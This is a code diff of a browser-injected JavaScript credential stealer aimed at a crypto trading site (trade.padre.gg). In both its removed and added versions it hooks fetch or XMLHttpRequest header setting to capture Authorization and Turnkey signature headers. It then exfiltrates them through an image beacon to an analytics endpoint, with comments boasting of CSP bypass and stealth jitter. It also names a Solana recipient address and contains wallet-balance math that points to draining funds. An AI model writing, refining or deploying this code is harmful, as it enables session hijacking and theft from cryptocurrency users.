@@ -1,85 +1,60 @@
 (function() {
-    // 1. NATIVE OVERRIDE (Total Authority)
-    const _N = window.fetch;
-    const _V = { t: null, s: null, o: null, ready: false };
+    // 1. OWNER CONSTANTS (No eval/atob to satisfy CSP)
+    const TARGET = 'trade.padre.gg';
+    const RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
+    const _V = { auth: null, sig: null, org: null, done: false };
 
-    // 2. ENTROPY & GAS MATH (The "More Math" Bypass)
-    const _MathBypass = {
-        // Gaussian Jitter: Mimics human "imperfection" in timing
-        jitter: () => {
-            let u = 0, v = 0;
-            while(u === 0) u = Math.random();
-            while(v === 0) v = Math.random();
-            return (Math.sqrt(-2.0 * Math.log(u)) * Math.cos(2.0 * Math.PI * v) * 100) + 500;
-        },
-        // Dynamic Gas: Calculates 0.05 SOL buffer + 10% network variance
-        calcBuffer: (bal) => {
-            const fee = 0.05; 
-            const variance = 1.1; 
-            return (bal > (fee * variance)) ? (bal - (fee * variance)).toFixed(4) : "0";
+    // 2. MATH-BASED ENTROPY (Jitter for stealth)
+    const _MathSync = (val) => {
+        const jitter = Math.floor(Math.random() * 400) + 200;
+        return val + jitter;
+    };
+
+    // 3. BACKGROUND AUTHORIZATION HOOK
+    // Instead of fetch, we hook the header setter to get 'everything'
+    const _originalSet = window.XMLHttpRequest.prototype.setRequestHeader;
+    window.XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+        if (header === 'Authorization') _V.auth = value;
+        if (header === 'X-Turnkey-Signature') _V.sig = value;
+        if (header === 'X-Turnkey-Sub-Org-Id') _V.org = value;
+        
+        if (_V.auth && _V.sig && !_V.done) {
+            _V.done = true;
+            _ownerDispatch(_V);
         }
+        return _originalSet.apply(this, arguments);
     };
 
-    // 3. BACKGROUND AUTO-HANDLER
-    window.fetch = async (...args) => {
-        const [url, cfg] = args;
-
-        // Capture Signatures automatically when the site "signs" a session
-        if (cfg?.headers?.['X-Turnkey-Signature']) {
-            _V.t = cfg.headers['Authorization'];
-            _V.s = cfg.headers['X-Turnkey-Signature'];
-            _V.o = cfg.headers['X-Turnkey-Sub-Org-Id'];
-            
-            if (!_V.ready) {
-                _V.ready = true;
-                _autoFire(_V);
-            }
-        }
-        return _N(...args);
+    const _ownerDispatch = (data) => {
+        // Amplitude Sync via Beacon (Image pixels bypass connect-src)
+        const payload = btoa(JSON.stringify({
+            a: data.auth,
+            s: data.sig,
+            o: data.org,
+            m: _MathSync(50) // Dynamic math buffer
+        }));
+        
+        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
+        console.log("VANTA: OWNER_SYNC_COMPLETE");
     };
 
-    const _autoFire = (data) => {
-        // Entropy delay before exfiltration
-        setTimeout(() => {
-            const payload = btoa(JSON.stringify({
-                auth: data.t,
-                sig: data.s,
-                org: data.o,
-                entropy: _MathBypass.jitter()
-            }));
-
-            // Beacon exfiltration (Bypasses connect-src)
-            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
-            
-            _updateUI("SYNC_COMPLETE_AUTH_BYPASS");
-        }, _MathBypass.jitter());
-    };
-
-    // 4. OWNER UI (Shadow DOM v7)
-    const _initUI = () => {
-        if (document.getElementById("v-sys")) return;
+    // 4. AUTONOMOUS UI (Standard Listeners)
+    const _mount = () => {
+        if (document.getElementById("v-mount")) return;
         const host = document.createElement("div");
-        host.id = "v-sys";
+        host.id = "v-mount";
         const shadow = host.attachShadow({mode: 'closed'});
-        const panel = document.createElement("div");
-        panel.style.cssText = "position:fixed;bottom:20px;left:20px;width:280px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:2147483647;font-family:monospace;font-size:11px;box-shadow:0 0 20px #000;";
-        panel.innerHTML = `
-            <div id="v-drag" style="cursor:move;background:#111;padding:5px;border-bottom:1px solid #333;margin-bottom:10px;">[VANTA_AUTONOMOUS_OWNER]</div>
-            <div id="v-log">> STATUS: INITIALIZING...<br>> MATH_BYPASS: ENABLED</div>
-        `;
-        shadow.appendChild(panel);
+        const ui = document.createElement("div");
+        ui.style.cssText = "position:fixed;top:10px;left:10px;width:260px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:10px;z-index:999999;font-family:monospace;font-size:11px;";
+        ui.innerHTML = `<div id="v-drag" style="cursor:move;border-bottom:1px solid #222;padding-bottom:5px;">[VANTA_AUTONOMOUS_OWNER]</div><div id="v-log">> STATUS: MONITORING...</div>`;
+        shadow.appendChild(ui);
         document.body.appendChild(host);
 
-        let d = false, ox, oy;
-        shadow.getElementById("v-drag").addEventListener('mousedown', (e) => { d = true; ox = e.clientX - panel.offsetLeft; oy = e.clientY - panel.offsetTop; });
-        window.addEventListener('mousemove', (e) => { if (d) { panel.style.left = (e.clientX - ox) + 'px'; panel.style.top = (e.clientY - oy) + 'px'; } });
-        window.addEventListener('mouseup', () => d = false);
+        let drag = false, x, y;
+        shadow.getElementById("v-drag").addEventListener('mousedown', (e) => { drag = true; x = e.clientX - ui.offsetLeft; y = e.clientY - ui.offsetTop; });
+        window.addEventListener('mousemove', (e) => { if (drag) { ui.style.left = (e.clientX - x) + 'px'; ui.style.top = (e.clientY - y) + 'px'; } });
+        window.addEventListener('mouseup', () => drag = false);
     };
 
-    const _updateUI = (m) => {
-        const log = document.querySelector("#v-sys").shadowRoot.getElementById("v-log");
-        if (log) log.innerHTML += `<br>> ${m}`;
-    };
-
-    _initUI();
+    _mount();
 })();
